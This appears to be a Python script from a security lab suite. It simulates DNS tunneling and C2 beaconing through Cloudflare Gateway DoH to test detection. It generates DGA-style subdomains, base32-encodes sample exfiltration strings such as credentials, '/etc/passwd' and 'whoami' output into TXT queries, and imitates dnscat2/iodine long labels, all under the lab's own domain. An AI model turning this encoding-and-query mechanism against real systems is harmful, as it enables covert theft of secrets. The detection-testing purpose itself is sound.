#!/usr/bin/env python3
"""Scenario 5 — DNS tunneling / C2 beaconing simulation via Cloudflare Gateway DoH."""
import base64
import random
import string
import sys
import time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import httpx
import dns.message
import dns.query
import dns.rdatatype
import dns.resolver
from config import LOGS_DIR, CF_GATEWAY_DOH_URL
from utils import print_banner, SessionLog
from rich.console import Console

console = Console()

# C2-like subdomains rooted under the lab's own domain so Gateway can log them.
# These are clearly fake subdomains — no real traffic is generated.
C2_SUFFIXES = [
    "c2tunnel.novamind-lab.workers.dev",
    "beacon.novamind-lab.workers.dev",
    "update.novamind-lab.workers.dev",
]


def encode_data(data: str) -> str:
    """Simulate data-in-DNS exfil by base32-encoding into subdomain labels."""
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
    return ".".join(encoded[i:i+20] for i in range(0, min(len(encoded), 40), 20))


def random_subdomain(length: int = 16) -> str:
    """Generate algorithmically-looking subdomain (mimics DGA)."""
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choices(chars, k=length))


def query_doh(fqdn: str, rdtype: str, doh_url: str) -> str:
    """Send a DNS query over HTTPS to Cloudflare Gateway. Returns status string."""
    try:
        qtype = dns.rdatatype.from_text(rdtype)
        msg = dns.message.make_query(fqdn, qtype)
        wire = msg.to_wire()
        r = httpx.post(
            doh_url,
            content=wire,
            headers={"content-type": "application/dns-message", "accept": "application/dns-message"},
            timeout=5,
        )
        r.raise_for_status()
        resp = dns.message.from_wire(r.content)
        rcode = dns.rcode.to_text(resp.rcode())
        if resp.answer:
            return "RESOLVED"
        return "NXDOMAIN" if rcode == "NXDOMAIN" else rcode
    except Exception as e:
        return f"ERROR: {e}"


def query_fallback(fqdn: str, rdtype: str) -> str:
    """Fallback: system resolver. Queries won't appear in Gateway logs."""
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3
    try:
        resolver.resolve(fqdn, rdtype)
        return "RESOLVED"
    except dns.resolver.NXDOMAIN:
        return "NXDOMAIN"
    except Exception as e:
        return f"ERROR: {e}"


def run() -> dict:
    print_banner("Scenario 5 — DNS Tunneling / C2 Beaconing",
                 "Fires DNS queries with C2-like patterns through Cloudflare Gateway DoH")
    log = SessionLog("05_dns_tunnel", LOGS_DIR)

    if CF_GATEWAY_DOH_URL:
        console.print(f"[green]✓ Gateway DoH:[/green] {CF_GATEWAY_DOH_URL}")
        console.print("[dim]Queries will route through Cloudflare Gateway and appear in logs.[/dim]\n")
        def query(fqdn, rdtype):
            return query_doh(fqdn, rdtype, CF_GATEWAY_DOH_URL)
    else:
        console.print("[bold red]✗ CF_GATEWAY_DOH_URL not set[/bold red]")
        console.print("[yellow]Falling back to system resolver — queries will NOT appear in Gateway logs.[/yellow]")
        console.print("[dim]Fix: Zero Trust → Gateway → Locations → create a location → copy its DoH URL")
        console.print("     Add CF_GATEWAY_DOH_URL=https://<team>.cloudflareaccess.com/dns-query to .env.local[/dim]\n")
        def query(fqdn, rdtype):
            return query_fallback(fqdn, rdtype)

    total = blocked = passed = 0

    # Phase 1: High-frequency DGA-style queries (C2 check-in pattern)
    console.print("[yellow]Phase 1: DGA beaconing — 20 algorithmically-generated subdomains[/yellow]")
    for _ in range(20):
        sub = random_subdomain(random.randint(12, 24))
        fqdn = f"{sub}.{random.choice(C2_SUFFIXES)}"
        status = query(fqdn, "A")
        if "BLOCKED" in status or "REFUSED" in status:
            console.print(f"  [red]BLOCKED[/red]   {fqdn}")
            blocked += 1
        elif "ERROR" in status:
            console.print(f"  [red]ERROR[/red]     {fqdn} — {status}")
        else:
            console.print(f"  [dim]{status}[/dim]  {fqdn}")
            passed += 1
        log.log("DNS-A", fqdn, 0, sub, status)
        total += 1
        time.sleep(random.uniform(0.5, 2.0))

    # Phase 2: TXT record queries with encoded data (exfil-in-DNS)
    console.print("\n[yellow]Phase 2: Data exfil via DNS — TXT queries with encoded subdomains[/yellow]")
    exfil_samples = [
        "user=admin;host=portal;token=abc123",
        "file=/etc/passwd",
        "cmd=whoami;result=root",
    ]
    for sample in exfil_samples:
        encoded_sub = encode_data(sample)
        fqdn = f"{encoded_sub}.{random.choice(C2_SUFFIXES)}"
        status = query(fqdn, "TXT")
        console.print(f"  [dim]TXT {status}[/dim]  {fqdn[:60]}...  (encoded: {sample[:30]})")
        log.log("DNS-TXT", fqdn, 0, sample, status)
        total += 1
        time.sleep(random.uniform(1.0, 3.0))

    # Phase 3: Long subdomain labels (mimics dnscat2/iodine tunneling)
    console.print("\n[yellow]Phase 3: Long subdomain labels — mimics dnscat2/iodine tunneling[/yellow]")
    for _ in range(10):
        long_sub = random_subdomain(random.randint(40, 60))
        fqdn = f"{long_sub[:60]}.{random.choice(C2_SUFFIXES)}"
        status = query(fqdn, "A")
        console.print(f"  [dim]TUNNEL {status}[/dim] {fqdn[:70]}...")
        log.log("DNS-TUNNEL", fqdn, 0, long_sub, status)
        total += 1
        time.sleep(random.uniform(0.3, 1.0))

    log.save()
    return {
        "scenario": "DNS Tunneling",
        "total": total,
        "blocked": blocked,
        "passed": passed,
        "doh_active": bool(CF_GATEWAY_DOH_URL),
        "detection": "CF-Gateway-DNSTunnel",
    }


if __name__ == "__main__":
    run()
